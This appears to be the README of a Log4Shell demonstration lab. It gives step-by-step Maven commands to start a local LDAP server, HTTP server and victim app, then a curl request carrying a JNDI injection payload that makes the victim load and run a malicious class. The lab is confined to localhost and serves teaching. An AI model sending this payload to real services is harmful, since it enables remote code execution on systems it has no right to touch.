# Log4shell attack demo

1. Build the project:
```bash 
./mvnw package
```
2. Start the LdapServer:
```bash
./mvnw exec:java -D"exec.mainClass"="de.predic8.LdapServer"
```
3. Start the HttpServer:
```bash
./mvnw exec:java -D"exec.mainClass"="de.predic8.HttpServer"
```
4. Start the victim:
```bash
./mvnw exec:java -D"exec.mainClass"="de.predic8.Opfer"
```
5. Use curl or your browser to invoke the following URL:
```bash
curl 'http://localhost:8000/hallo?name=$\{jndi:ldap://localhost:10389/cn=badcode,dc=predic8,dc=de\}'
```
or open in your browser:
`http://localhost:8000/hallo?name=`

The victim application will write into its log and the ldap query will be executed. The result of the Ldap query will make the victim loading the malicious class from the HTTP server and executing it.


